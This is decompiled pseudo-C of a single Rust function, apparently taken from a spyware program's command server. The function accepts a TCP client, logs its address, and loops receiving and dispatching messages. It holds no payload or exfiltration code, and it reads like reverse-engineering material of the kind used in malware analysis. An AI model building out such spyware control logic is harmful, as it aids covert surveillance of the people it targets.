
  int64_t spyware::communication::server::handle_client::hb99b66a85b0a9c88(int32_t arg1)

{
    int32_t fd = arg1;
    
    if (core::sync::atomic::atomic_load::h8c88032dab18ab12() < 4)
        goto label_44ce5d;
    
    int16_t var_e8;
    std::net::tcp::TcpStream::peer_addr::h9ccf6949693ba95c(&var_e8, &fd);
    int16_t rax_1 = var_e8;
    int64_t result;
    int64_t result_2;
    
    if (rax_1 != 2)
    {
        int16_t var_e2;
        int64_t var_58;
        *var_58[6] = var_e2;
        int32_t var_e6;
        *var_58[2] = var_e6;
        int128_t var_d8;
        int128_t var_18_1 = var_d8;
        var_58 = rax_1;
        int64_t result_3 = result_2;
        int128_t var_48 = var_d8;
        int64_t* var_68 = &var_58;
        int64_t (* var_60_1)(char* arg1) = _$LT$core..net..socket_addr..SocketAddr$u20$as$u20$core..fmt..Display$GT$::fmt::hb8f0b665671134da;
        char const (** const var_a8)[0xf5] = &data_4b8c30;
        int64_t var_a0_1 = 1;
        int128_t var_90;
        *var_90[8] = 0;
        int64_t** var_98_1 = &var_68;
        var_90 = 1;
        int64_t rax_2 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b8c70);
        var_e8 = "spyware::communication::serverUn…";
        int64_t var_e0 = 0x1e;
        var_d8 = "spyware::communication::serverUn…";
        *var_d8[8] = 0x1e;
        int128_t var_c8;
        var_c8 = rax_2;
        log::__private_api::log::h13afddf373bd7d7f(&var_a8, 4, &var_e8);
        label_44ce5d:
        
        while (true)
        {
            spyware::communication::server::get_message::hbc00a55f19d841bb(&var_58, &fd);
            
            if (var_58 == -0x7ffffffffffffff6)
                break;
            
            var_e8 = var_58;
            var_a8 = &data_4b8c50;
            int64_t var_a0_2 = 1;
            int64_t var_98_2 = 8;
            int128_t var_90_1 = {0};
            std::io::stdio::_print::h17d6c2a1d6a6f99e(&var_a8);
            int128_t var_28;
            int128_t var_78_1 = var_28;
            int128_t var_38;
            var_90_1 = var_38;
            var_98_2 = var_48;
            var_a8 = var_e8;
            spyware::communication::server::handle_message::h02435bd595e8370d(&var_a8, &fd);
        }
        
        result = result_3;
        int64_t result_1 = result;
        var_a8 = &data_4b8c40;
        int64_t var_a0_3 = 1;
        int64_t var_98_3 = 8;
        int128_t var_90_2 = {0};
        std::io::stdio::_print::h17d6c2a1d6a6f99e(&var_a8);
        
        if (core::sync::atomic::atomic_load::h8c88032dab18ab12())
        {
            var_68 = &result_1;
            int64_t (* var_60_2)(int64_t* arg1, int64_t* arg2) = _$LT$std..io..error..Error$u20$as$u20$core..fmt..Display$GT$::fmt::hcf0c0103019d8a0a;
            var_a8 = &data_4b8c60;
            int64_t var_a0_4 = 1;
            *var_90_2[8] = 0;
            int64_t** var_98_4 = &var_68;
            var_90_2 = 1;
            int64_t rax_4 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b8c88);
            var_e8 = "spyware::communication::serverUn…";
            int64_t var_e0_1 = 0x1e;
            var_d8 = "spyware::communication::serverUn…";
            *var_d8[8] = 0x1e;
            var_c8 = rax_4;
            log::__private_api::log::h13afddf373bd7d7f(&var_a8, 1, &var_e8);
            result = result_1;
        }
    }
    else
        result = result_2;
    core::ptr::drop_in_place$LT$std..net..tcp..TcpStream$GT$::hf7372bfdd8ef8cfe(fd);
    return result;
}
